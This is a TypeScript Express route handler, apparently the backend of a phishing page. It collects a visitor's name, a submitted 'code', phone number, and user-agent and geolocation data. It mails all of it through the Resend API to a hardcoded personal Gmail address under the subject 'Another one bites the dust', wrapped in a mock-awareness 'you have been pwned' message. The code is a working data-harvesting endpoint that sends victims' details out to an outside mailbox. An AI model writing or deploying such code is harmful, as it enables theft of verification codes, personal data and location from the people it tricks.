import { ENVIRONMENT } from '@/common/config';
import { ILocation } from '@/common/interfaces';
import { extractUAData, logger } from '@/common/utils';
import { catchAsync } from '@/middlewares';
import { Resend } from 'resend';

export const pwned = catchAsync(async (req, res) => {
	const userAgent: Partial<ILocation> = await extractUAData(req);

	const constructMessage = `Dear ${req.body.firstName}, you have been pwned!

here are your details: ${req.body.code}

${Object.keys(userAgent)
	.map((key) =>
		key === 'geo'
			? Object.keys(userAgent?.[key] ?? {})
					.map((geoKey) => `${geoKey}: ${userAgent?.[key]?.[geoKey] ?? ''}`)
					.join('\n')
			: `${key}: ${userAgent[key]}`
	)
	.join('\n')}

@+${req.body.phoneNumber}
Stop clicking on suspicious links no matter how tempting they are.
No matter who sent them, no matter how much you trust them.
Just stop clicking on them.

Hope you learn from this experience. 
`;

	const resend = new Resend(ENVIRONMENT.EMAIL.API_KEY);

	await resend.emails.send({
		from: 'pwned@abeghelp.me',
		to: 'obcbeats@gmail.com',
		subject: 'Another one bites the dust',
		text: constructMessage,
	});

	logger.info(`Pwned email successfully delivered`);
	logger.info(constructMessage);
	res.status(200).json({ message: 'Pwned! successfully' });
});
